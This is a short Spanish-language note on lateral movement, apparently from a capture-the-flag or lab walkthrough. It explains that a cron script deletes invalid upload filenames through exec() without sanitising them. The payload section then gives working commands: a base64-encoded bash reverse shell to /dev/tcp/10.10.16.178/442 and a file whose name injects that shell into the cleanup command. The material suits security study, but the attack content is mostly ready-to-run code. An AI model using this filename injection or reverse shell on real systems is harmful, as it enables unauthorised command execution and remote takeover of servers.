Movimiento lateral

Interpretar Script

# El script lista los archivos en la carpeta /uploads y comprueba si son válidos según su nombre. Los archivos no válidos se eliminan mediante la función exec() del sistema.

# La variable $value almacena el nombre del archivo, pero el script no lo sanitiza, lo que significa que podemos inyectar comandos a través de nombres de archivo especiales. Por ejemplo, un archivo llamado “; cmd” dará como resultado el comando

# Esto dará lugar a la ejecución del comando especificado por "cmd". Comprobemos si funciona. El comando debe estar codificado en base64, ya que no podemos usar '/' en los nombres de archivo.

Payload

cd /var/www/html/uploads
# Reverse shell en Base64
echo -n 'bash -c "bash -i > /dev/tcp/10.10.16.178/442 0>&1"' | base64
# Listener 442

# Fichero con nombre inválido para que cuando se ejecute el cron elimine el fichero y al no sanitizar el input interprete el resto del código
echo '' > ';echo YmFzaCAtYyAiYmFzaCAtaSA+IC9kZXYvdGNwLzEwLjEwLjE2LjE3OC80NDIgMD4mMSI= | base64 -d | bash'
